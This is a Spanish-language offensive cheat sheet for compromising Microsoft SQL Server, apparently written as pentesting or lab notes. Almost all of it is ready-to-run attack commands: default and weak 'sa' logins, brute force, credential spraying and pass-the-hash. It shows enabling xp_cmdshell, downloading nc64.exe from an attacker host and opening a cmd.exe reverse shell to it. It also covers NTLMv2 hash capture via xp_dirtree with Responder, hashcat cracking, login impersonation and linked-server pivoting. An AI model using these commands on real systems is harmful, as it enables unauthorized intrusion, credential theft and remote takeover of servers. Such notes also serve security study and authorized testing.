# Microsoft SQL Server (1433)

Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion #LinkedServers

## OBJETIVO

- Validar acceso desde fuera y desde dentro del servidor
- Enumerar usuarios, bases de datos y permisos
- Obtener RCE vía xp_cmdshell
- Capturar hash NTLMv2 para crackear offline
- Escalar dentro de MSSQL via impersonación y linked servers

## TIPS

1. **Siempre probar autenticación Windows (-windows-auth) Y SQL → una puede funcionar cuando la otra no**
2. **xp_cmdshell deshabilitado por defecto → solo sysadmin puede habilitarlo**
3. **xp_dirtree apuntando a tu IP → captura hash NTLMv2 sin necesidad de RCE**
4. **NT Authority\System puede conectarse al MSSQL local sin credenciales**
5. **Responder ANTES de ejecutar xp_dirtree → si lo haces al revés no capturas nada**
6. **Impersonación → si puedes actuar como SA → xp_cmdshell aunque no seas sysadmin**

## TOOLS

- [Impacket-mssqlclient](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Responder](https://github.com/lgandx/Responder)
- [sqsh](https://sourceforge.net/projects/sqsh/)
- [Hashcat](https://hashcat.net/hashcat/)

```bash 
# ARCHIVOS DENTRO DEL SERVER

- C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI    
# Archivo de configuración que contiene credenciales 
```

# DESDE FUERA DEL SERVIDOR (ACCESO REMOTO)

## 1. PROBAR ACCESO CON USUARIO SA (POR DEFECTO) Y VALIDACIÓN CON CREDENCIALES CONOCIDAS (DESDE AFUERA)

```bash
# sa → System Administrator → usuario por defecto de MSSQL
# Frecuentemente habilitado con contraseña débil o vacía

❯ nxc mssql ❮IP❯ -u 'sa' -p ''
❯ nxc mssql ❮IP❯ -u 'sa' -p '' --local-auth
# Sin contraseña → el más común en instalaciones mal configuradas

❯ nxc mssql ❮IP❯ -u 'sa' -p 'sa' 
❯ nxc mssql ❮IP❯ -u 'sa' -p 'admin' 
❯ nxc mssql ❮IP❯ -u 'sa' -p 'Password1' 
❯ nxc mssql ❮IP❯ -u 'sa' -p 'password' 
# Contraseñas comunes para sa → probar siempre antes de fuerza bruta


IMPORTANTE 
	- [Pwn3d!] → sa está habilitado y eres sysadmin → xp_cmdshell disponible
```

```bash
❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' 
❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' --local-auth
# Autenticación SQL local → no requiere dominio

❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' -d domain.corp
# Autenticación Windows con dominio → más común en AD

❯ nxc mssql ❮IP❯ -u 'user' -H 'NThash' -d domain.corp
# Pass-the-Hash → sin contraseña en claro


IMPORTANTE:
	- [Pwn3d!] → sysadmin → xp_cmdshell directo
	- Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
```

### 1a. Fuerza bruta 
```bash 
❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt --local-auth
# Fuerza bruta al sa con wordlist corta → más rápido

❯ nxc mssql ❮IP❯ -u users.txt -p passwords.txt --continue-on-success
# Spraying de credenciales
```

### 1b. Si se trae el puerto por medio de un Pivot (Chisel) - VALIDACIÓN
```bash 
❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' 
❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' --local-auth
```

## 2. CONEXIÓN Y AUTENTICACIÓN

```bash
# Si el puerto esta expuesto en el server  
# Autenticación Windows (dominio) → más común en AD
❯ impacket-mssqlclient domain01.corp/'user:passwd'@❮IP❯ -windows-auth     <- IMPORTANTE 

# Puerto no estándar
❯ impacket-mssqlclient domain.corp/'user:passwd'@❮IP❯ -windows-auth -port 1433
```

```bash 
# Autenticación SQL local con el usuario → sa 
❯ impacket-mssqlclient 'sa:passwd'@❮IP❯

# sqsh → alternativa cuando impacket falla
❯ sqsh -S ❮IP❯ -U 'user' -P 'passwd'
	# Los comandos en sqsh terminan con 'go' para ejecutarse


IMPORTANTE:
	- [Pwn3d!] → sysadmin → xp_cmdshell directo
	- Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
```

### 2a. Si se trae el puerto por medio de un Pivot (Chisel) - AUTENTICACIÓN 

```bash 
❯ impacket-mssqlclient 'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE

❯ impacket-mssqlclient domain01.corp/'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE 
❯ impacket-mssqlclient domain01.corp/'user:passwd'@localhost -windows-auth 
```


### 2b. OBTENER REVERSE SHELL (DESDE AFUERA)

```bash 
Paso 0: (OPCIONAL)
# Un login que no pertenece al rol sysadmin puede cambiar el contexto a sa si tiene el permiso efectivo IMPERSONATE sobre ese login, o un privilegio más amplio que incluya esa capacidad. No todos los usuarios pueden hacerlo

❯ exec_as_login sa    # Si se tiene el permiso cambiara al user SA → SYSADMIN
```

```bash
IMPORTANTE
	- [Pwn3d!] → sysadmin → xp_cmdshell directo
	- Requiere xp_cmdshell habilitado → ser sysadmin o impersonar SA


Paso 1:
❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# 1 → soy sysadmin | 0 → no lo soy
# Determina si puedo habilitar xp_cmdshell

Paso 2:
# Activarlo en caso de ser necesario 
❯ EXEC sp_configure 'show advanced options', 1;
❯ RECONFIGURE;

❯ EXEC sp_configure 'xp_cmdshell', 1;
❯ RECONFIGURE;
# Activar xp_cmdshell 

Paso 3:
# comprobar si quedo habilitado 
❯ EXEC sp_configure 'xp_cmdshell';

# Se debería ver config_value y run_value en 1
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1  

Paso 4:
# Ejecutar comandos
❯ EXEC xp_cmdshell 'whoami';
❯ EXEC xp_cmdshell 'hostname';
```

```bash 
# REVERSHELL
Paso 1:
# Crear directorio temporal si no existe
❯ xp_cmdshell "mkdir C:\Temp"


# Paso 2 → Descargar nc64.exe desde Kali
❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc64.exe C:\temp\nc64.exe'
# Antes: 
	python3 -m http.server 80   # Compartir el Netcat desde Kali 

# Alternativa a certutil
❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc64.exe\",\"C:\temp\nc64.exe\")"'


# Paso 3 → Ejecutar reverse shell
❯ EXEC xp_cmdshell 'C:\temp\nc64.exe -e cmd.exe ❮IP_KALI❯ 443'
# Antes: 
	penelope -p 443       # Recibir la revershell en Kali  
	rlwrap nc -nlvp 443   # Recibir la revershell en Kali
```

## 5. ENUMERACIÓN DENTRO DEL MSSQL (DESDE FUERA)

```bash
# Dentro de impacket-mssqlclient

❯ help
# Ver todos los comandos disponibles de impacket

❯ enum_db
# Listar todas las bases de datos

❯ enum_users
# Usuarios de la base de datos actual
```

```bash 
# Queries SQL directas

❯ SELECT name FROM master.dbo.sysdatabases
# Todas las bases de datos

❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# 1 → soy sysadmin | 0 → no lo soy
# Determina si puedo habilitar xp_cmdshell

❯ SELECT name, type_desc, is_disabled FROM sys.server_principals
# Todos los logins → usuarios locales, de dominio, sa

❯ SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');

❯ SELECT name, is_disabled FROM sys.server_principals WHERE type = 'S'
# Solo logins SQL (no Windows)

❯ xp_dirtree C:\Users\
# Explorar sistema de archivos sin necesitar xp_cmdshell

❯ xp_dirtree C:\inetpub\wwwroot\
# Raíz IIS → buscar configs con credenciales
```

## 6. VERIFICAR Y USAR IMPERSONACIÓN (ESCALAR EN MSSQL)

```bash
# Impersonación → actuar como otro usuario con más privilegios
# Muy común en entornos mal configurados → jon.snow puede ser samwel.tarlly → SA

# Verificar si puedo impersonar a alguien
❯ SELECT distinct b.name
  FROM sys.server_permissions a
  INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE'
# Si devuelve usuarios → puedo impersonarlos

❯ SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'
# Ver todos los permisos de impersonación disponibles

# Impersonar el usuario encontrado
❯ EXECUTE AS LOGIN = 'samwel.tarlly'
❯ SELECT SYSTEM_USER
# Confirmar que ahora soy samwel.tarlly

❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# 1 → el usuario impersonado es SA → puedo usar xp_cmdshell

# Habilitar y usar xp_cmdshell como el usuario impersonado
❯ enable_xp_cmdshell
❯ xp_cmdshell "whoami"

# Volver al usuario original
❯ REVERT
```

## 7. LINKED SERVERS — PIVOTAR A OTRO SERVIDOR SQL

```bash
# Linked servers → este servidor tiene conexión a otro servidor MSSQL
# Permite ejecutar queries en el servidor remoto

# Ver linked servers disponibles
❯ SELECT * FROM sys.servers
❯ SELECT * FROM sys.linked_logins
# Ver con qué usuario se conecta al servidor remoto

# Ejecutar comando en el linked server
❯ EXEC('xp_cmdshell ''whoami''') AT braavos
# 'braavos' → nombre del linked server

❯ EXEC('SELECT @@version') AT braavos
# Verificar conectividad con el linked server

❯ EXEC('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT braavos
# Ver si el usuario tiene SA en el servidor remoto

# Si tienes SA en el linked server → xp_cmdshell remoto
❯ EXEC('EXEC xp_cmdshell ''whoami''') AT braavos
# RCE en el servidor remoto sin comprometerlo directamente

# Cadena de linked servers → linked server de linked server
❯ EXEC('EXEC(''xp_cmdshell ''''whoami'''''') AT braavos') AT castelblack
# Ejecutar en un tercer servidor a través de dos saltos
```

## 8. CAPTURA DE HASH NTLMv2 (SIN RCE)

### Con Responder

```bash
# PASO 1 → Responder PRIMERO en Kali
❯ responder -I tun0

# PASO 2 → Dentro de mssqlclient
❯ xp_dirtree \\❮IP_KALI❯\aa
# Autentica automáticamente → captura el hash NTLMv2

# PASO 3 → Crackear
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Con impacket-smbserver

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
# En Kali → levantar servidor SMB

❯ xp_dirtree \\❮IP_KALI❯\smbFolder\test
# Dentro de mssqlclient → captura el hash

❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Con sqsh

```bash
❯ responder -I tun0
❯ sqsh -S ❮IP❯ -U 'user' -P 'passwd'
❯ xp_dirtree '\\❮IP_KALI❯\aa'
❯ go
```

# DESDE DENTRO DEL SERVIDOR (ACCESO LOCAL)

## 9. CONECTARSE AL MSSQL LOCAL SIN CREDENCIALES

```bash
# NT Authority\System puede conectarse al MSSQL local sin contraseña
# Porque SYSTEM es el dueño del servicio → autenticación implícita

# Verificar si MSSQL está corriendo localmente
❯ netstat -ano | findstr 1433
❯ ss -tlnp | grep 1433
❯ Get-Service | Where-Object {$_.Name -like "*sql*"}
❯ sc query MSSQLSERVER
❯ sc query "MSSQL$INSTANCE"    # Si tiene nombre de instancia
```

### Desde CMD como SYSTEM o Admin local

```bash
# Conexión con sqlcmd → herramienta nativa de SQL Server
❯ sqlcmd -S localhost -Q "SELECT SYSTEM_USER"
# Sin credenciales → usa autenticación Windows del usuario actual
# Si eres SYSTEM → autenticas como SA implícitamente

❯ sqlcmd -S localhost -Q "SELECT IS_SRVROLEMEMBER('sysadmin')"
# 1 → soy sysadmin desde SYSTEM

❯ sqlcmd -S localhost -Q "EXEC xp_cmdshell 'whoami'"
# RCE desde SYSTEM → sin credenciales externas

# Con nombre de instancia
❯ sqlcmd -S localhost\SQLEXPRESS -Q "SELECT SYSTEM_USER"
❯ sqlcmd -S .\SQLEXPRESS -Q "SELECT SYSTEM_USER"

# Listar instancias disponibles
❯ sqlcmd -L
```

### Desde PowerShell como SYSTEM o Admin local

```powershell
# Sin credenciales → autenticación Windows implícita
❯ Invoke-Sqlcmd -Query "SELECT SYSTEM_USER" -ServerInstance localhost
❯ Invoke-Sqlcmd -Query "SELECT IS_SRVROLEMEMBER('sysadmin')" -ServerInstance localhost
❯ Invoke-Sqlcmd -Query "EXEC xp_cmdshell 'whoami'" -ServerInstance localhost

# Si el módulo no está disponible → cargar manualmente
❯ Import-Module SqlServer
❯ Invoke-Sqlcmd -Query "SELECT SYSTEM_USER" -ServerInstance "localhost"

# Alternativa con .NET directamente
❯ $conn = New-Object System.Data.SqlClient.SqlConnection
❯ $conn.ConnectionString = "Server=localhost;Integrated Security=True"
❯ $conn.Open()
❯ $cmd = $conn.CreateCommand()
❯ $cmd.CommandText = "SELECT SYSTEM_USER"
❯ $cmd.ExecuteScalar()
```

## 10. VERIFICAR EL USUARIO DEL SERVICIO SQL (DESDE DENTRO)

```bash
# Saber con qué usuario corre el servicio MSSQL
# Importante porque ese usuario puede tener SeImpersonatePrivilege

❯ sc qc MSSQLSERVER
# Ver "SERVICE_START_NAME" → usuario del servicio

❯ Get-WmiObject Win32_Service | Where-Object {$_.Name -like "*sql*"} | Select Name,StartName
# PowerShell → usuario del servicio SQL

❯ tasklist /v | findstr /i "sql"
# Ver procesos SQL y el usuario que los ejecuta

# Usuarios típicos del servicio MSSQL:
# NT Service\MSSQLSERVER   → tiene SeImpersonatePrivilege → Potato attack
# NT Authority\System      → SYSTEM → acceso total
# NT Authority\Network Service → tiene SeImpersonatePrivilege
# DOMAIN\ServiceAccount    → cuenta de dominio → credenciales valiosas
```

## 11. ENUMERAR DESDE DENTRO CON SQLCMD

```bash
# Enumeración completa desde shell local como SYSTEM o admin

❯ sqlcmd -S localhost -Q "SELECT name FROM master.dbo.sysdatabases"
# Todas las bases de datos

❯ sqlcmd -S localhost -Q "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('U','G','S')"
# Todos los logins → usuarios Windows, grupos y SQL

❯ sqlcmd -S localhost -Q "SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'"
# Ver impersonación disponible desde dentro

❯ sqlcmd -S localhost -Q "SELECT * FROM sys.servers"
# Linked servers → otros SQL servers enlazados

❯ sqlcmd -S localhost -Q "SELECT name FROM sys.databases"
# Bases de datos disponibles

❯ sqlcmd -S localhost -Q "USE ❮database❯; SELECT * FROM information_schema.tables"
# Tablas de una base de datos específica
```


## CONDICIONES CLAVE

```
¿Tengo sa o sysadmin?          → enable_xp_cmdshell → RCE directo
¿Sin sysadmin pero con acceso? → verificar impersonación → actuar como SA
¿Puedo impersonar SA?          → EXECUTE AS LOGIN → sysadmin → RCE
¿Hay linked servers?           → EXEC('xp_cmdshell...') AT server → RCE remoto
¿Soy SYSTEM local?             → sqlcmd sin creds → SA implícito → RCE
¿El servicio SQL usa SeImpersonate? → Potato attack → SYSTEM del host
```

## ONE-LINERS MENTALES

- Puerto 1433 abierto → probar sa sin contraseña primero
- [Pwn3d!] → enable_xp_cmdshell → xp_cmdshell "whoami"
- Sin sysadmin → verificar impersonación → EXECUTE AS LOGIN → escalar
- Linked server disponible → EXEC('xp_cmdshell...') AT server → RCE en otro host
- SYSTEM local → sqlcmd -S localhost sin creds → SA implícito
- Servicio SQL como NT Service\MSSQL → SeImpersonatePrivilege → Potato
- Sin RCE → Responder primero → xp_dirtree a tu IP → NTLMv2 → crackear